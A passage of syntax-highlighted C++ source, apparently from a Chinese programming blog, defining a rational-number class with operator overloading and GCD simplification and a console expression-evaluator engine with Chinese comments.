class="keyword">operator</span> &lt;&lt; (ostream &amp;os,Rational_Numbers &amp;input) <span class="comment">//重载&lt;&lt;号</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; int2str(input.numerator) + <span class="string">" /"</span> + int2str(input.denominator);</span><br><span class="line">		<span class="keyword">return</span> os;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span> &gt;&gt; (istream &amp;is, Rational_Numbers &amp;input) <span class="comment">//重载&gt;&gt;号</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; input.numerator &gt;&gt; input.denominator;</span><br><span class="line">		input.simplify();</span><br><span class="line">		<span class="keyword">return</span> is;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">operator</span> == (Rational_Numbers &amp;input) <span class="comment">//重载==号</span></span><br><span class="line">	&#123;</span><br><span class="line">		simplify();</span><br><span class="line">		input.simplify();</span><br><span class="line">		<span class="keyword">if</span> (denominator == input.denominator &amp;&amp; numerator == input.numerator)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	Rational_Numbers <span class="keyword">operator</span> = (Rational_Numbers input) <span class="comment">//重载=号</span></span><br><span class="line">	&#123;</span><br><span class="line">		input.simplify();</span><br><span class="line">		name = input.name;</span><br><span class="line">		denominator = input.denominator;</span><br><span class="line">		numerator = input.numerator;</span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: realNumber</span></span><br><span class="line"><span class="comment">	*Description: 返回这个类的实数</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">double</span> <span class="title">realNumber</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt; (numerator) / <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt; (denominator);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: simplify</span></span><br><span class="line"><span class="comment">	*Description: 将这个有理数化简</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function">Rational_Numbers <span class="title">simplify</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (myabs(numerator) == myabs(denominator) &amp;&amp; numerator != <span class="number">0</span>) <span class="comment">//如果分子分母相同, 化简为1</span></span><br><span class="line">		&#123;</span><br><span class="line">			numerator /= myabs(numerator); <span class="comment">//这样能保证符号和原来的相同</span></span><br><span class="line">			denominator /= myabs(denominator);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (numerator == <span class="number">0</span>) <span class="comment">//如果分子为0, 直接返回并将分母设为1</span></span><br><span class="line">			&#123;</span><br><span class="line">				denominator = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> ((myabs(numerator) &gt; myabs(denominator)) &amp;&amp; (myabs(numerator) % myabs(denominator) == <span class="number">0</span>)) <span class="comment">//如果分子分母是倍数关系, 可以直接化简</span></span><br><span class="line">				&#123;</span><br><span class="line">					numerator /= myabs(denominator);</span><br><span class="line">					denominator /= myabs(denominator);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> ((myabs(denominator) &gt; myabs(numerator)) &amp;&amp; (myabs(denominator) % myabs(numerator) == <span class="number">0</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						denominator /= myabs(numerator);</span><br><span class="line">						numerator /= myabs(numerator);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">long</span> <span class="keyword">long</span> gcd = <span class="number">0</span>;<span class="comment">//Greatest Common Divisor(GCD) 最大公约数</span></span><br><span class="line">						<span class="keyword">long</span> <span class="keyword">long</span> temp = <span class="number">0</span>;</span><br><span class="line">						<span class="keyword">long</span> <span class="keyword">long</span> left = <span class="number">0</span>;</span><br><span class="line">						<span class="keyword">long</span> <span class="keyword">long</span> right = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (myabs(numerator) &gt; myabs(denominator)) <span class="comment">//大的数作为left</span></span><br><span class="line">						&#123;</span><br><span class="line">							left = myabs(numerator);</span><br><span class="line">							right = myabs(denominator);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							left = myabs(denominator);</span><br><span class="line">							right = myabs(numerator);</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">while</span> (<span class="literal">true</span>)  <span class="comment">//辗转相减法:left - right = temp 直到 right == temp</span></span><br><span class="line">						&#123;</span><br><span class="line">							temp = left - right;</span><br><span class="line">							<span class="keyword">if</span> (temp == right)</span><br><span class="line">							&#123;</span><br><span class="line">								gcd = temp;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">if</span> (right &gt; temp) <span class="comment">//如果temp&gt;right ,根据辗转相减, 大的放左边</span></span><br><span class="line">								&#123;</span><br><span class="line">									left = right;</span><br><span class="line">									right = temp;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span></span><br><span class="line">								&#123;</span><br><span class="line">									left = temp;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						numerator /= gcd;</span><br><span class="line">						denominator /= gcd;</span><br><span class="line">					&#125;			</span><br><span class="line">				&#125;			</span><br><span class="line">			&#125;		</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (numerator &lt; <span class="number">0</span> &amp;&amp; denominator &lt; <span class="number">0</span>) <span class="comment">//如果都小于零, 返回正值</span></span><br><span class="line">		&#123;</span><br><span class="line">			denominator *= <span class="number">-1</span>;</span><br><span class="line">			numerator *= <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (numerator &gt; <span class="number">0</span> &amp;&amp; denominator &lt; <span class="number">0</span>) <span class="comment">//将负号保持在分子上</span></span><br><span class="line">		&#123;</span><br><span class="line">			numerator *= <span class="number">-1</span>;</span><br><span class="line">			denominator *= <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyioEngine</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">int</span> mode = <span class="number">0</span>;<span class="comment">//保存当前的模式</span></span><br><span class="line">	<span class="keyword">bool</span> wrong = <span class="literal">true</span>;<span class="comment">//用来检测calcEngine的状态</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; instructions;<span class="comment">//保存指令</span></span><br><span class="line">	<span class="built_in">vector</span>&lt;Rational_Numbers&gt; nums;<span class="comment">//保存所有的变量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: format</span></span><br><span class="line"><span class="comment">	*Description: 将输入的字符串格式化.大写转小写以及清除空格</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="built_in">string</span> &amp;input)</span> <span class="comment">//将字符全部转换为小写,去除空格</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = input.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) <span class="comment">//逆序以防止删除错误的字符</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (input[i] &gt;= <span class="string">'A'</span> &amp;&amp; input[i] &lt;= <span class="string">'Z'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				input[i] += <span class="number">32</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (input[i] == <span class="string">' '</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				input.erase(input.begin() + i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: loadInstructions</span></span><br><span class="line"><span class="comment">	*Description: 从控制台录入指令</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">loadInstructions</span><span class="params">()</span> <span class="comment">//读取指令</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		instructions.clear();</span><br><span class="line">		<span class="built_in">string</span> instructionLine;<span class="comment">//定义命令行</span></span><br><span class="line">		<span class="built_in">string</span> instruction;<span class="comment">//定义指令</span></span><br><span class="line">		</span><br><span class="line">		getline(<span class="built_in">cin</span>, instructionLine);<span class="comment">//获取指令行</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; instructionLine.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (instructionLine[i] != <span class="string">' '</span>)<span class="comment">//第一个循环, 找到第一个不是空格的字符</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (; i &lt; instructionLine.size(); ++i)<span class="comment">//进入第二个循环,检测空格以找到字符串尾部</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (instructionLine[i] == <span class="string">' '</span> || i == instructionLine.size() - <span class="number">1</span>)<span class="comment">//找到第二个空格或者说此字符是指令行的最后一个, 说明字符串到头了</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (instructionLine[i] != <span class="string">' '</span>)<span class="comment">//兼容此字符是指令行的最后一个的情况</span></span><br><span class="line">						&#123;</span><br><span class="line">							instruction.push_back(instructionLine[i]);</span><br><span class="line">						&#125;</span><br><span class="line">						format(instruction);</span><br><span class="line">						instructions.push_back(instruction);<span class="comment">//放入指令容器中</span></span><br><span class="line">						instruction.clear();<span class="comment">//清除当前指令, 录入下一个</span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					instruction.push_back(instructionLine[i]);<span class="comment">//不是空格, 将此字符录入指令中</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: checkNums</span></span><br><span class="line"><span class="comment">	*Description: 检查输入的字符串是否都是数字</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">checkNums</span><span class="params">(<span class="built_in">string</span> input)</span> <span class="comment">//检查是否全部是数字</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (input[<span class="number">0</span>] == <span class="string">'-'</span>) <span class="comment">//检测第一个数是不是-号</span></span><br><span class="line">		&#123;</span><br><span class="line">			input.erase(input.begin());<span class="comment">//如果是, 删掉-号</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (input.size() == <span class="number">0</span>) <span class="comment">//检测字符串是不是只有一个负号</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (input[i] &gt; <span class="string">'9'</span> || input[i] &lt; <span class="string">'0'</span>) <span class="comment">//只要检测到不在0~9之间的字符就返回false</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: checkVaild</span></span><br><span class="line"><span class="comment">	*Description: 检查输入的字符串是否合法</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">checkVaild</span><span class="params">(<span class="built_in">string</span> input)</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">char</span> temp = input[i];</span><br><span class="line">			<span class="keyword">if</span> (temp == <span class="string">'@'</span> || temp == <span class="string">'$'</span> || temp == <span class="string">'+'</span> || temp == <span class="string">'-'</span> || temp == <span class="string">'*'</span> || temp == <span class="string">'/'</span> || checkNums(input)) <span class="comment">//只要检测到非法字符就返回false PS:$运算中要用到, 作为保留字符</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: getAddress</span></span><br><span class="line"><span class="comment">	*Description: 输入变量的名字, 存在返回nums中的地址, 不存在返回-1</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">getAddress</span><span class="params">(<span class="built_in">string</span> input)</span> <span class="comment">//检测是否有相同名字的元素出现</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (input == nums[i].name)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> i; <span class="comment">//相同的返回下标</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">//没有相同的返回-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: getDataDir</span></span><br><span class="line"><span class="comment">	*Description: 得到当前程序的目录位置</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="built_in">string</span> <span class="title">getDataDir</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">char</span> _path[<span class="number">1000</span>];</span><br><span class="line">		_getcwd(_path, <span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">string</span> path = _path;</span><br><span class="line">		path = path + <span class="string">"\\vars.RNS"</span>; <span class="comment">//加上储存的文件名</span></span><br><span class="line">		<span class="keyword">return</span> path;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: deleteTemps</span></span><br><span class="line"><span class="comment">	*Description: 根据计算的次数删掉对应次数的临时变量</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">deleteTemps</span><span class="params">(<span class="keyword">int</span> tempCount)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tempCount; ++i)<span class="comment">//删掉计算过程中的中间变量</span></span><br><span class="line">		&#123;</span><br><span class="line">			nums.pop_back();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: getLeftname</span></span><br><span class="line"><span class="comment">	*Description: 根据input字符串和运算符地址, 找到左边的变量标识符</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="built_in">string</span> <span class="title">getLeftname</span><span class="params">(<span class="built_in">string</span> input, <span class="keyword">int</span> operatorAdd,<span class="keyword">int</span> &amp;leftCharAdd, <span class="built_in">string</span> currentOperator)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">string</span> leftname;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (leftCharAdd = operatorAdd - <span class="number">1</span>; leftCharAdd &gt;= <span class="number">0</span>; --leftCharAdd) <span class="comment">//得到运算符左边的标识符的起始字符的地址</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (input[leftCharAdd] == <span class="string">'+'</span> || input[leftCharAdd] == <span class="string">'-'</span> || input[leftCharAdd] == <span class="string">'*'</span> || input[leftCharAdd] == <span class="string">'/'</span> || input[leftCharAdd] == <span class="string">'@'</span>) <span class="comment">//遇到计算符号退出, 得到变量的第一个字符的地址</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		++leftCharAdd;<span class="comment">//如果通过遇到计算符号退出, j指向的是计算符；若是运行到0退出, j为-1.综上, j需要+1才行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (operatorAdd == leftCharAdd)<span class="comment">//如果位置相同, 说明运算符左边没有变量的标识符</span></span><br><span class="line">		&#123;</span><br><span class="line">			wrong = <span class="literal">true</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"表达式中"</span> + currentOperator + <span class="string">"需要一个左值"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">return</span> leftname;<span class="comment">//这个值不会被用到</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			leftname.assign(input.begin() + leftCharAdd, input.begin() + operatorAdd);<span class="comment">//将名字赋值给leftname</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> leftname;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: getRightname</span></span><br><span class="line"><span class="comment">	*Description: 根据input字符串和运算符地址, 找到右边的变量标识符</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="built_in">string</span> <span class="title">getRightname</span><span class="params">(<span class="built_in">string</span> input, <span class="keyword">int</span> operatorAdd, <span class="keyword">int</span> &amp;rightCharAdd, <span class="built_in">string</span> currentOperator)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">string</span> rightname;</span><br><span class="line"></span><br><span class="line">												<span class="comment">//不想看到warning, 干脆强行转换一波吧233</span></span><br><span class="line">		<span class="keyword">for</span> (rightCharAdd = operatorAdd + <span class="number">1</span>; rightCharAdd &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(input.size()); rightCharAdd++) <span class="comment">//得到运算符右边的名字</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (input[rightCharAdd] == <span class="string">'+'</span> || input[rightCharAdd] == <span class="string">'-'</span> || input[rightCharAdd] == <span class="string">'*'</span> || input[rightCharAdd] == <span class="string">'/'</span> || input[rightCharAdd] == <span class="string">'@'</span>) <span class="comment">//遇到计算符号退出, 得到变量的第一个字符的地址</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		--rightCharAdd;<span class="comment">//如果通过遇到计算符号退出, rightCharAdd指向的是计算符；若是运行到0退出, rightCharAdd为size大小.综上, rightCharAdd需要-1才行</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (operatorAdd == rightCharAdd)</span><br><span class="line">		&#123;</span><br><span class="line">			wrong = <span class="literal">true</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"表达式中"</span> + currentOperator + <span class="string">"需要一个右值"</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//如果位置相同, 说明运算符右边没有变量的标识符</span></span><br><span class="line">			<span class="keyword">return</span> rightname;<span class="comment">//这个值不会被用到</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			rightname.assign(input.begin() + operatorAdd + <span class="number">1</span>, input.begin() + rightCharAdd + <span class="number">1</span>);<span class="comment">//将名字赋值给rightname,注意此时operatorAdd指向的是计算符号, 所以还得+1</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> rightname;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: negativeConversion</span></span><br><span class="line"><span class="comment">	*Description: 将负号转换为计算器能理解的变量</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">negativeConversion</span><span class="params">(<span class="built_in">string</span> &amp;input,<span class="keyword">int</span> &amp;tempCount)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; operators;</span><br><span class="line">		nums.emplace_back(<span class="string">"$neg"</span>, <span class="number">-1</span>, <span class="number">1</span>);<span class="comment">//添加值为-1的变量</span></span><br><span class="line">		++tempCount;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = input.size() - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i)<span class="comment">//如果减号前面跟着一个运算符号, 那么它的意义是负号.倒序替换适配连续减号的情况</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (input[i] == <span class="string">'-'</span> &amp;&amp; (input[i - <span class="number">1</span>] == <span class="string">'*'</span> || input[i - <span class="number">1</span>] == <span class="string">'/'</span> || input[i - <span class="number">1</span>] == <span class="string">'+'</span> || input[i - <span class="number">1</span>] == <span class="string">'-'</span>) &amp;&amp; i != input.size() - <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				input.replace(input.begin() + i, input.begin() + i + <span class="number">1</span>, <span class="string">"$neg@"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (input[<span class="number">0</span>] == <span class="string">'-'</span>)<span class="comment">//如果第一个字符就是减号, 那么减号代表的意义一定是负号</span></span><br><span class="line">		&#123;</span><br><span class="line">			input.replace(input.begin(), input.begin() + <span class="number">1</span>, <span class="string">"$neg@"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: calcEngine</span></span><br><span class="line"><span class="comment">	*Description: 计算引擎 输入表达式返回结果</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function">Rational_Numbers <span class="title">calcEngine</span><span class="params">(<span class="built_in">string</span> input)</span> </span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		wrong = <span class="literal">true</span>;<span class="comment">//wrong复位</span></span><br><span class="line">		<span class="function">Rational_Numbers <span class="title">result</span><span class="params">(<span class="string">"1"</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">		<span class="function">Rational_Numbers <span class="title">temp</span><span class="params">(<span class="string">"$temp"</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;<span class="comment">//创建一个temp变量, 注意在计算中它的名字是temp.name</span></span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; operators;<span class="comment">//记录所有运算符的位置</span></span><br><span class="line">		<span class="keyword">int</span> tempCount = <span class="number">0</span>;<span class="comment">//记录运算次数</span></span><br><span class="line">		<span class="keyword">int</span> operatorAdd = <span class="number">0</span>;<span class="comment">//记录当前计算运算符的位置</span></span><br><span class="line"></span><br><span class="line">		negativeConversion(input, tempCount);<span class="comment">//将意义为负号的减号转换成neg@来计算</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.size(); ++i) <span class="comment">//如果input中没有计算符号, 说明输入有误</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (input[i] == <span class="string">'*'</span> || input[i] == <span class="string">'/'</span> || input[i] == <span class="string">'+'</span> || input[i] == <span class="string">'-'</span> || input[i] == <span class="string">'@'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				wrong = <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (wrong)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入的表达式没有计算符号"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			deleteTemps(tempCount);</span><br><span class="line">			<span class="keyword">return</span> result;<span class="comment">//这里这个值不会被用到, 只是为了满足返回的要求</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (input == <span class="string">"$temp"</span> + int2str(tempCount - <span class="number">1</span>)) <span class="comment">//如果只剩下这个, 说明计算完成</span></span><br><span class="line">			&#123;</span><br><span class="line">				result = nums.back();</span><br><span class="line">				deleteTemps(tempCount);</span><br><span class="line">				<span class="keyword">return</span> result;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			operators.clear();<span class="comment">//复位</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.size(); ++i)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (input[i] == <span class="string">'@'</span>)<span class="comment">//找到除号</span></span><br><span class="line">				&#123;</span><br><span class="line">					operatorAdd = i;</span><br><span class="line">					<span class="keyword">goto</span> negative;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.size(); ++i)</span><br><span class="line">			&#123;				</span><br><span class="line">				<span class="keyword">if</span> (input[i] == <span class="string">'*'</span> || input[i] == <span class="string">'/'</span> || input[i] == <span class="string">'+'</span> || input[i] == <span class="string">'-'</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					operators.push_back(i);<span class="comment">//录入所有运算符的位置</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; operators.size(); ++i) <span class="comment">//先找*运算符, 然后依次找/ + - .满足* / + -的顺序进行计算</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> ((input[operators[i]] == <span class="string">'*'</span> &amp;&amp; i == <span class="number">0</span>) || (input[operators[i]] == <span class="string">'*'</span> &amp;&amp; input[operators[i - <span class="number">1</span>]] != <span class="string">'/'</span>))<span class="comment">//找到乘号, 如果（是第一个运算符）或者（不是第一个运算符且前面不是除号）, 进行计算.（这么做是为了保证如果只剩下乘和除的情况下, 按照顺序计算）</span></span><br><span class="line">				&#123;							</span><br><span class="line">					operatorAdd = operators[i];</span><br><span class="line">					<span class="keyword">goto</span> muti;<span class="comment">//跳到计算步骤</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.size(); 